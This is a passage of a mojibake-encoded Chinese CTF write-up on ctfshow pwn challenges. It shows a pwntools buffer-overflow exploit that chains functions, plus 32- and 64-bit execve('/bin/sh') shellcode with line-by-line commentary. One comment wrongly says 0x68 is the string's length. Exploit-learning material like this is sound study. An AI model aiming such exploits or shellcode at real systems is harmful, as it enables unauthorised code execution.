</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28207</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_func1</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;flag_func1&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_func2</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;flag_func2&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x2c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag_func1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag_func2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xACACACAC</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xBDBDBDBD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Input your flag: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x2c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag_func1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag_func2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xACACACAC</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xBDBDBDBD</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œä½ æƒ³å¿…æŠŠæœ‰ç‚¹æ‡µï¼Œä¸ºä»€ä¹ˆè¦å…ˆflagå†åˆ°å‚æ•°ï¼Œä¸æ˜¯åº”è¯¥å…ˆæ‰§è¡Œå®Œå‡½æ•°ã€ä¼ å®Œå‚å†åˆ°å¦å¤–ä¸€ä¸ªå‡½æ•°å—ï¼Ÿæ„Ÿè§‰å¾ˆä¹±å•Š&hellip;.</p>
<p>32 ä½ç¨‹åºè°ƒç”¨å‡½æ•°æ—¶ï¼Œéµå¾ªä¸¤ä¸ªå…³é”®è§„åˆ™ï¼ˆè¿™æ˜¯ç†è§£ payload çš„å‰æï¼‰ï¼š</p>
<ol>
<li><strong>å‚æ•°å‹æ ˆé¡ºåº</strong>ï¼šå‡½æ•°çš„å‚æ•°è¦æŒ‰ â€œä»å³åˆ°å·¦â€ çš„é¡ºåºï¼Œä¾æ¬¡æ”¾åˆ°æ ˆä¸Šï¼›</li>
<li><strong>è¿”å›åœ°å€è·Ÿç€å‚æ•°</strong>ï¼šå‚æ•°å‹å®Œåï¼Œè¦å‹å…¥ â€œå‡½æ•°æ‰§è¡Œå®Œåè¦è·³è½¬åˆ°çš„åœ°å€â€ï¼ˆå³ä¸‹ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼‰ï¼Œæœ€åæ‰æ˜¯ â€œå½“å‰è¦è°ƒç”¨çš„å‡½æ•°åœ°å€â€ã€‚</li>
</ol>
</blockquote>
<p>ç°åœ¨è¿™äº›é¢˜ç›®éœ€è¦æˆ‘ä»¬å¯¹ä»£ç å…·æœ‰ä¸€å®šé˜…è¯»ç†è§£èƒ½åŠ›ï¼Œç†è§£ä»£ç çš„è¿ä½œåŸç†ï¼Œè€Œä¸å†åƒæ–°æ‰‹å…¥é—¨é‚£æ ·æ— è„‘å¥—ret2shellcodeã€ret2libcã€è„šæœ¬äº†ã€‚</p>
<h3 id="è®¤è¯†32ä½å’Œ64ä½çš„shellcode"><strong>è®¤è¯†32ä½å’Œ64ä½çš„shellcode</strong>
</h3><h3 id="pwn_056">PWN_056
</h3><p>é¢˜ç›®ï¼šå…ˆäº†è§£ä¸€ä¸‹ç®€å•çš„32ä½shellcodeå§ã€‚</p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/196.png"
	width="934"
	height="216"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/196_hu_ae51ca9a6dc8f358.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/196_hu_7869cf41786bb51c.png 1024w"
	loading="lazy"
	
		alt="startå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="432"
		data-flex-basis="1037px"
	
></p>
<p>è¿™é‡Œå°±æ˜¯é€åˆ†çš„äº†ï¼ŒæŠŠ/bin/shèµ‹å€¼ç»™v1ï¼Œç„¶åè°ƒç”¨execveå‡½æ•°ï¼ˆç±»ä¼¼systemå‡½æ•°ï¼‰å»æ‰§è¡Œï¼Œè¿™ä¸å°±æ˜¯ç›´æ¥ç»ˆç«¯äº¤äº’å—ï¼Ÿ</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28189</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç°åœ¨æ¥çœ‹æ±‡ç¼–è¯­è¨€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0x68</span>
</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0x732f2f2f</span>
</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0x6e69622f</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>
</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0xB</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">int</span> <span class="mh">0x80</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ®µä»£ç æ˜¯x86æ±‡ç¼–è¯­è¨€çš„ä»£ç ï¼Œç”¨äºåœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ¥æ‰§è¡Œ<code>execve(&quot;/bin/sh&quot;, NULL, NULL) </code>ã€‚è®©æˆ‘ä»¬é€è¡Œè§£æä»£ç çš„åŠŸèƒ½ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0x68</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç å°†åå…­è¿›åˆ¶å€¼ 0x68 ï¼ˆ104çš„åè¿›åˆ¶è¡¨ç¤ºï¼‰å‹å…¥æ ˆä¸­ã€‚è¿™æ˜¯ä¸ºäº†å°†åç»­çš„å­—ç¬¦ä¸² &ldquo;/bin/sh&quot;çš„é•¿åº¦ï¼ˆ11ä¸ªå­—ç¬¦ï¼‰æ”¾å…¥æ ˆä¸­ï¼Œä»¥ä¾¿åç»­ä½¿ç”¨ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0x732f2f2f</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç å°†åå…­è¿›åˆ¶å€¼ 0x732f2f2f å‹å…¥æ ˆä¸­ã€‚è¿™æ˜¯å­—ç¬¦ä¸² &ldquo;/bin/sh&rdquo; çš„å‰åŠéƒ¨åˆ†å­—ç¬¦çš„é€†åºè¡¨ç¤ºï¼Œå³ &ldquo;sh//&quot;ã€‚è¿™æ˜¯å› ä¸ºx86æ¶æ„æ˜¯å°ç«¯å­—èŠ‚åºçš„ï¼Œå­—ç¬¦ä¸²éœ€è¦ä»¥é€†åºæ–¹å¼å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚ï¼ˆä½†å…¶å®2f2få¯ä»¥æ¢æˆ0000ï¼Œè¡¥ç©ºä½ï¼Œé‚£å°±æ˜¯0x732f0000ï¼šshï¼Œä¸è¦//éƒ½å¯ä»¥çš„ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0x6e69622f</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç å°†åå…­è¿›åˆ¶å€¼ 0x6e69622f å‹å…¥æ ˆä¸­ã€‚è¿™æ˜¯å­—ç¬¦ä¸² &ldquo;/bin/sh&rdquo; çš„ååŠéƒ¨åˆ†å­—ç¬¦çš„é€†åºè¡¨ç¤ºï¼Œå³ &ldquo;/bin&rdquo;ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç å°†æ ˆé¡¶çš„åœ°å€ï¼ˆå³å­—ç¬¦ä¸² &ldquo;/bin/sh&rdquo; çš„èµ·å§‹åœ°å€ï¼‰å¤åˆ¶ç»™å¯„å­˜å™¨ ebx ã€‚ ebx å¯„å­˜å™¨å°†ç”¨ä½œ<code>execve</code> ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³è¦æ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸¤è¡Œä»£ç ä½¿ç”¨å¼‚æˆ–æ“ä½œå°† ecx å’Œ edx å¯„å­˜å™¨çš„å€¼è®¾ç½®ä¸ºé›¶ã€‚ ecx å’Œ edx åˆ†åˆ«å°†ç”¨ä½œ execveç³»ç»Ÿè°ƒç”¨çš„ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚åœ¨æ­¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†å®ƒä»¬è®¾ç½®ä¸º NULLï¼Œè¡¨ç¤ºæ²¡æœ‰å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚ï¼ˆè¿™ä¸å°±æ˜¯æ‰‹æ•²shellcodeçš„é‚£æ®µä»£ç å—ï¼Ÿ<a class="link" href="https://expl0rer.top/p/ctfshow-pwn-writeup/#%e9%80%90%e8%a1%8c%e8%a7%a3%e6%9e%90%e6%89%8b%e6%95%b2shellcode"  target="_blank" rel="noopener"
    >åœ¨ä¸€å¼€å§‹çš„wpï¼šPWN_024</a>ï¼‰è¿‡è¿™ä¹ˆä¹…äº†å¿˜å¾—å·®ä¸å¤šäº†ï¼Œåœ¨è¿™é‡Œå›å¿†ä¸€ä¸‹å•Šã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0xB</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸¤è¡Œä»£ç å°†å€¼ 11 ï¼ˆ 0xb ï¼‰å‹å…¥æ ˆä¸­ï¼Œç„¶åä»æ ˆä¸­å¼¹å‡ºåˆ°å¯„å­˜å™¨ eax ã€‚ eax å¯„å­˜å™¨å°†ç”¨ä½œç³»ç»Ÿè°ƒç”¨å·ï¼Œ 11 è¡¨ç¤º execve ç³»ç»Ÿè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">int</span> <span class="mh">0x80</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç è§¦å‘ä¸­æ–­ 0x80 ï¼Œè¿™æ˜¯Linuxç³»ç»Ÿä¸­ç”¨äºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„ä¸­æ–­æŒ‡ä»¤ã€‚é€šè¿‡è®¾ç½®é€‚å½“çš„å¯„å­˜å™¨å€¼ï¼ˆ eax ã€ ebx ã€ ecx ã€ edx ï¼‰ï¼Œ int 0x80 æŒ‡ä»¤å°†æ‰§è¡Œ execve(&quot;/bin/sh&rdquo;, NULL, NULL) ç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œå¯åŠ¨ä¸€ä¸ªæ–°çš„ shell è¿›ç¨‹ã€‚</p>
<p>æ€»ç»“èµ·æ¥ï¼Œè¿™æ®µæ±‡ç¼–ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨åœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œ execve(&quot;/bin/sh&rdquo;, NULL,NULL) ï¼Œå³æ‰“å¼€ä¸€ä¸ªæ–°çš„shellè¿›ç¨‹ã€‚</p>
<h3 id="pwn_057">PWN_057
</h3><p>é¢˜ç›®ï¼šå…ˆäº†è§£ä¸€ä¸‹ç®€å•çš„64ä½shellcodeå§ã€‚</p>
<p>IDA64ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/197.png"
	width="775"
	height="91"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/197_hu_4ea3113fe1deac76.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/197_hu_85677d2664cb8eb9.png 1024w"
	loading="lazy"
	
		alt="startå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="851"
		data-flex-basis="2043px"
	
></p>
<blockquote>
<h4 id="å†…è”æ±‡ç¼–-syscall-linux---çš„ä½œç”¨">å†…è”æ±‡ç¼– <code>syscall; LINUX -</code> çš„ä½œç”¨
</h4><ul>
<li><code>syscall</code>ï¼šæ˜¯ x86-64 æ¶æ„ä¸‹çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œç”¨äºè§¦å‘ Linux ç³»ç»Ÿè°ƒç”¨ï¼ˆè°ƒç”¨æ“ä½œç³»ç»Ÿå†…æ ¸æä¾›çš„åŠŸèƒ½ï¼Œå¦‚è¿›ç¨‹é€€å‡ºã€æ–‡ä»¶æ“ä½œç­‰ï¼‰ã€‚</li>
<li><code>LINUX -</code> å¯èƒ½æ˜¯ç®€åŒ–æˆ–æ³¨é‡Šæ®‹ç•™ï¼Œå®é™…æœ‰æ•ˆçš„æŒ‡ä»¤åªæœ‰ <code>syscall</code>ã€‚ç³»ç»Ÿè°ƒç”¨çš„å…·ä½“åŠŸèƒ½ç”± <code>rax</code> å¯„å­˜å™¨çš„å€¼å†³å®šï¼ˆä¾‹å¦‚ <code>rax=60</code> è¡¨ç¤º <code>exit</code> ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºç»ˆæ­¢å½“å‰è¿›ç¨‹ï¼‰ã€‚</li>
</ul>
</blockquote>
<p>æ€»çš„æ¥è¯´è¿™ä¿©é¢˜æ˜¯è®©æˆ‘ä»¬è®¤è¯†shellcodeçš„æ ·å­ï¼Œä»¥ä¾¿åé¢ä½¿ç”¨&hellip;</p>
<p>expåŒä¸Šã€‚</p>
<p>é‡ç‚¹è¿˜æ˜¯çœ‹æ±‡ç¼–ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span><span class="s">&#39;/bin//sh&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rbx</span>
</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rsp</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rdi</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">59</span>
</span></span><span class="line"><span class="cl"><span class="nf">syscall</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ®µä»£ç æ˜¯x86-64æ±‡ç¼–è¯­è¨€çš„ä»£ç ï¼Œç”¨äºåœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œ <code>execve(&quot;/bin/sh&quot;, NULL,NULL) </code>ã€‚è®©æˆ‘ä»¬é€è¡Œè§£æä»£ç çš„åŠŸèƒ½ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç å°† rax å¯„å­˜å™¨çš„å€¼ï¼ˆé€šå¸¸ç”¨äºå­˜æ”¾å‡½æ•°è¿”å›å€¼ï¼‰å‹å…¥æ ˆä¸­ã€‚è¿™é‡Œçš„ç›®çš„æ˜¯ä¿ç•™ rax çš„å€¼ï¼Œä»¥ä¾¿åç»­ä½¿ç”¨ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸¤è¡Œä»£ç ä½¿ç”¨å¼‚æˆ–æ“ä½œå°† rdx å’Œ rsi å¯„å­˜å™¨çš„å€¼è®¾ç½®ä¸ºé›¶ã€‚ rdx å’Œ rsi åˆ†åˆ«å°†ç”¨ä½œ execveç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸‰ä¸ªå’Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ç¯å¢ƒå˜é‡å’Œå‘½ä»¤è¡Œå‚æ•°ã€‚åœ¨æ­¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†å®ƒä»¬è®¾ç½®ä¸º NULLï¼Œè¡¨ç¤ºæ²¡æœ‰ç¯å¢ƒå˜é‡å’Œå‘½ä»¤è¡Œå‚æ•°ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="s">&#39;/bin//sh&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç å°†å­—ç¬¦ä¸² &lsquo;/bin//sh&rsquo; çš„åœ°å€èµ‹å€¼ç»™ rbx å¯„å­˜å™¨ã€‚å­—ç¬¦ä¸² &lsquo;/bin//sh&rsquo; æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚åœ¨x86-64æ±‡ç¼–ä¸­ï¼Œå­—ç¬¦ä¸²è¢«å½“ä½œåœ°å€å¤„ç†ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rbx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç å°† <code>rbx </code>å¯„å­˜å™¨çš„å€¼ï¼ˆå­—ç¬¦ä¸² &lsquo;/bin//sh&rsquo; çš„åœ°å€ï¼‰å‹å…¥æ ˆä¸­ã€‚è¿™æ˜¯ä¸ºäº†å°†å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¼ é€’ç»™ <code>execve</code>ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rsp</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rdi</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸¤è¡Œä»£ç å°†æ ˆé¡¶çš„åœ°å€ï¼ˆå³å­—ç¬¦ä¸² &lsquo;/bin//sh&rsquo; çš„åœ°å€ï¼‰å¼¹å‡ºåˆ° <code>rdi</code> å¯„å­˜å™¨ã€‚ rdi å¯„å­˜å™¨å°†ç”¨ä½œexecve ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">59</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç å°† al å¯„å­˜å™¨è®¾ç½®ä¸ºå€¼ 59 ï¼Œ 59 æ˜¯ execve ç³»ç»Ÿè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">syscall</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¡Œä»£ç è§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚é€šè¿‡è®¾ç½®é€‚å½“çš„å¯„å­˜å™¨å€¼ï¼ˆ <code>rax </code>ã€ <code>rdi </code>ã€ <code>rsi</code> ã€<code>rdx</code>ï¼‰ï¼Œ syscall æŒ‡ä»¤å°†æ‰§è¡Œ <code>execve(&quot;/bin/sh&quot;, NULL, NULL) </code>ç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œå¯åŠ¨ä¸€ä¸ªæ–°çš„ shell è¿›ç¨‹ã€‚</p>
<p>æ€»ç»“èµ·æ¥ï¼Œè¿™æ®µæ±‡ç¼–ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨åœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œ execve(&quot;/bin/sh&rdquo;, NULL,NULL) ï¼Œå³æ‰“å¼€ä¸€ä¸ªæ–°çš„shellè¿›ç¨‹ã€‚ä¸å‰ä¸€ä¸ªç¤ºä¾‹ç›¸æ¯”ï¼Œè¿™æ®µä»£ç æ˜¯x86-64æ¶æ„ä¸‹çš„æ±‡ç¼–ä»£ç ï¼Œä½¿ç”¨é€šç”¨å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚</p>
<h3 id="pwn_058">pwn_058
</h3><p>é¢˜ç›®ï¼š32ä½ æ— é™åˆ¶ã€‚</p>
